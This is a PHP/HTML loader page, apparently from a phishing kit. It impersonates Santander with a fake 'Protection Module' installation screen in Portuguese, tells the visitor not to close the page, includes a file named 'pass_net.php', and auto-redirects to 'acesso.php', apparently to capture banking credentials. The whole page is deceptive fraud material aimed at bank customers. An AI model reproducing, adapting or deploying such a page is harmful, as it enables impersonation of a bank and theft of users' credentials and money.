<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
	<meta http-equiv="refresh" content=8;url="acesso.php">
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_loader">Iniciando Módulo de Proteção Santander</h1>
				<p class="desc_loader">Preparando arquivos e checando dados...</p>
			</div>

			<div class="md_boxTables">
				
				<div class="loader"></div>
				
				<span class="infx_ld">
					Aguarde alguns segundos enquanto preparamos para inciar a execução do Módulo de Proteção. 
				</span>

				<span class="note_atr" style="text-align:center;">
					<br><br>
					<b class="red_txt">ATENÇÃO:</b><br>
					<small class="not_close">Não feche ou encerre esta página enquanto não finalizado o processo de instalação do Módulo de Segurança.</span>
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>